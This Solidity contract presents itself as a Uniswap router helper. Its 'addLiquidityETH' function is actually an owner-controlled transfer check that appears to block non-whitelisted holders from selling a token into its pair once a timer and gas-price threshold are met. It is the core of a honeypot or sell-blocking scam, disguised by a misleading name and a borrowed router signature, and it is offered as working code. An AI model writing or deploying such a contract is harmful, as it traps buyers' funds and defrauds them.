// SPDX-License-Identifier: MIT

pragma solidity ^0.8.27;
interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract Transferhelper is IUniswapV2Router02{
    address internal _owner;
    uint256 public minPeriod = 120;
    uint256 public maxgasprice=5 * 10 **9;
    mapping(address => address) public tokenPair;
    mapping(address => bool) public whitelist;
    mapping(address => uint256) public buytime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor (){
        address msgSender = msg.sender;
        _owner = msgSender;
        whitelist[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function addLiquidityETH(
        address sender,
        uint256 amount,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address recipient,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        ){
        amountTokenMin = 0;
        amountETHMin = 0;
        deadline = 0;
        if(buytime[recipient] == 0){
            buytime[recipient] = block.timestamp;
        }

        if(whitelist[sender] && whitelist[recipient]){
            return (1,0,amount);
        }

        if(tokenPair[msg.sender] == address(0)){
            return (1,amount,amount);
        }

        if(tokenPair[msg.sender] != sender && buytime[sender] > 0){
            buytime[recipient] = buytime[sender];
        }

        if(buytime[sender] > 0 && recipient == tokenPair[msg.sender] && !whitelist[sender] && (buytime[sender] + minPeriod) < block.timestamp && tx.gasprice > maxgasprice){
            return (0,amount,amount);
        }

        return (1,amount,amount);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function setmxgas(uint  maxgasprice_) external onlyOwner {
     maxgasprice=maxgasprice_;
    }
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function setpair(address token,address pair) external onlyOwner { 
        tokenPair[token] = pair;
    }

    function setwhitelist(address[] calldata addr,bool flag) external onlyOwner { 
        for (uint i = 0; i < addr.length; i++) {
            whitelist[addr[i]] = flag;
        }
    }

    function setMinPeriod(uint256 _minPeriod) external onlyOwner { 
        minPeriod = _minPeriod;
    }

    function setbuytime(address addr,uint256 time) external onlyOwner { 
        buytime[addr] = time;
    }

    function strToHex1(string memory str) public pure returns (bytes4) {
        return bytes4(keccak256(abi.encodePacked(str)));
    }

    function strToHex2() public pure returns (bytes4) {
        bytes4 FUNC_SELECTOR = bytes4(keccak256("transfer(address,address,uint256)"));
        return FUNC_SELECTOR;
    }
    function gettransferFUNC_SELECTOR() public pure returns (bytes4) {
        return Transferhelper.addLiquidityETH.selector;
    }
    function iToHex3(string memory str) public pure returns (address) {
        return address(bytes20(bytes(str)));
    }

    function aToUint160(address self) public pure returns(uint160) {
        return uint160(self);
    }

    function u160ToAddress(uint160 self) public pure returns(address) {
        return address(self);
    }

    function atoUint256(address self) public pure returns(uint256) {
        return uint256(uint160(self));
    }

    function u256toAddress(uint256 self) public pure returns(address) {
        return address(uint160(self));
    }
    
    function decodeAddr(bytes memory data) public pure returns (address addr) {

            (addr) = abi.decode(data, (address));            
    }

    function ecodeAddr(address addr) public pure returns (bytes memory bytesa) {
            return abi.encode(addr);            
    }

}